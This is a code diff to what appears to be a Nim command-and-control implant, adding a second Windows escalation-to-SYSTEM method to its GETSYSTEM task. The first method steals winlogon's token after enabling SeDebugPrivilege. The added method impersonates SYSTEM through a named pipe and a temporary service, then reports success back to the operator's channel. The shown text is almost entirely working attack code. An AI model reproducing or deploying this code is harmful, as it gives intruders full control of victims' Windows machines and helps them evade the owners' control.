@@ -413,35 +413,83 @@ when defined(windows):
     return $cast[WideCString](addr buf[0])
 
   proc doGetSystem(): string =
+    # ── T1: SeDebugPrivilege + winlogon token steal ──────────────────────
     var hSelf: HANDLE
     if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr hSelf) != 0:
       discard enablePriv(hSelf, "SeDebugPrivilege"); discard CloseHandle(hSelf)
-    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-    if snap == INVALID_HANDLE_VALUE: return "CreateToolhelp32Snapshot failed"
-    defer: discard CloseHandle(snap)
-    var pe: PROCESSENTRY32W; pe.dwSize = DWORD(sizeof(pe))
-    var sysPid: DWORD = 0
-    if Process32FirstW(snap, addr pe).bool:
-      while true:
-        if ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii() == "winlogon.exe":
-          sysPid = pe.th32ProcessID; break
-        if not Process32NextW(snap, addr pe).bool: break
-    if sysPid == 0: return "winlogon.exe not found"
-    let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sysPid)
-    if hProc == 0: return "OpenProcess(winlogon) failed (err " & $GetLastError() & ")"
-    defer: discard CloseHandle(hProc)
-    var hTok: HANDLE
-    if OpenProcessToken(hProc, TOKEN_DUPLICATE, addr hTok) == 0:
-      return "OpenProcessToken(winlogon) failed (err " & $GetLastError() & ")"
-    defer: discard CloseHandle(hTok)
-    var hDup: HANDLE
-    discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
-      securityImpersonation, tokenImpersonation, addr hDup)
-    if hDup == 0: return "DuplicateTokenEx failed"
-    if ImpersonateLoggedOnUser(hDup) == 0:
-      discard CloseHandle(hDup); return "ImpersonateLoggedOnUser failed"
-    discard CloseHandle(hDup)
-    return "[+] SYSTEM token impersonated (winlogon PID=" & $sysPid & ")"
+    block t1:
+      let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+      if snap == INVALID_HANDLE_VALUE: break t1
+      defer: discard CloseHandle(snap)
+      var pe: PROCESSENTRY32W; pe.dwSize = DWORD(sizeof(pe))
+      var sysPid: DWORD = 0
+      if Process32FirstW(snap, addr pe).bool:
+        while true:
+          if ($cast[WideCString](addr pe.szExeFile[0])).toLowerAscii() == "winlogon.exe":
+            sysPid = pe.th32ProcessID; break
+          if not Process32NextW(snap, addr pe).bool: break
+      if sysPid == 0: break t1
+      let hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, sysPid)
+      if hProc == 0: break t1
+      defer: discard CloseHandle(hProc)
+      var hTok: HANDLE
+      if OpenProcessToken(hProc, TOKEN_DUPLICATE, addr hTok) == 0: break t1
+      defer: discard CloseHandle(hTok)
+      var hDup: HANDLE
+      discard DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, nil,
+        securityImpersonation, tokenImpersonation, addr hDup)
+      if hDup == 0: break t1
+      if ImpersonateLoggedOnUser(hDup) == 0: discard CloseHandle(hDup); break t1
+      discard CloseHandle(hDup)
+      return "[+] T1 SYSTEM (winlogon PID=" & $sysPid & ")"
+
+    # ── T2: Named pipe impersonation via service (overlapped, 15s timeout) ─
+    let rnd = GetTickCount() xor (GetCurrentProcessId() shl 4)
+    let pipeName = r"\\.\pipe\svc" & toHex(rnd, 8)
+    let svcName  = "svc" & toHex(rnd xor 0xDEADBEEF'u32, 8)
+    let binPath  = "cmd.exe /c echo . > " & pipeName
+
+    let hPipe = CreateNamedPipeW(newWideCString(pipeName),
+      DWORD(0x00000003) or DWORD(0x40000000), # PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
+      DWORD(0), 1'u32, 512'u32, 512'u32, 0'u32, nil)
+    if hPipe == INVALID_HANDLE_VALUE:
+      return "[-] T1+T2 failed (CreateNamedPipe err " & $GetLastError() & ")"
+    defer: discard CloseHandle(hPipe)
+
+    let hScm = OpenSCManagerW(nil, nil, DWORD(0xF003F)) # SC_MANAGER_ALL_ACCESS
+    if hScm == 0:
+      return "[-] T1+T2 failed (OpenSCManager err " & $GetLastError() & ", need local admin)"
+    defer: discard CloseServiceHandle(hScm)
+
+    let hSvc = CreateServiceW(hScm, newWideCString(svcName), newWideCString(svcName),
+      SERVICE_ALL_ACCESS, DWORD(0x10), DWORD(0x3), DWORD(0),
+      newWideCString(binPath), nil, nil, nil, nil, nil)
+    if hSvc == 0:
+      return "[-] T1+T2 failed (CreateService err " & $GetLastError() & ")"
+    defer:
+      discard DeleteService(hSvc)
+      discard CloseServiceHandle(hSvc)
+
+    let hEvent = CreateEventW(nil, WINBOOL(1), WINBOOL(0), nil)
+    if hEvent == 0:
+      return "[-] T1+T2 failed (CreateEvent)"
+    defer: discard CloseHandle(hEvent)
+
+    var ov: OVERLAPPED
+    zeroMem(addr ov, sizeof(ov))
+    ov.hEvent = hEvent
+
+    discard StartServiceW(hSvc, 0, nil)
+    discard ConnectNamedPipe(hPipe, addr ov) # async — ERROR_IO_PENDING expected
+
+    let wr = WaitForSingleObject(hEvent, DWORD(15000))
+    if wr != WAIT_OBJECT_0:
+      discard CancelIoEx(hPipe, addr ov)
+      return "[-] T1+T2 failed (T2 pipe timeout res=" & $wr & ")"
+
+    if ImpersonateNamedPipeClient(hPipe) == 0:
+      return "[-] T1+T2 failed (ImpersonateNamedPipeClient err " & $GetLastError() & ")"
+    return "[+] T2 SYSTEM (named pipe + service)"
 
   # ── Token Store ──────────────────────────────────────────────────────────────
   proc doTokenStoreSteal(pid: DWORD): string =
@@ -1573,7 +1621,10 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     else: t.sendResult(id, runShell("id"), "")
 
   of "GETSYSTEM":
-    when defined(windows): t.sendResult(id, doGetSystem(), "")
+    when defined(windows):
+      let gsOut = doGetSystem()
+      if gsOut.startsWith("[+]"): t.sendResultAdmin(id, gsOut, "", true)
+      else: t.sendResult(id, gsOut, "")
     else: t.sendResult(id, "", "GETSYSTEM: not supported on Linux")
 
   of "PERSIST":
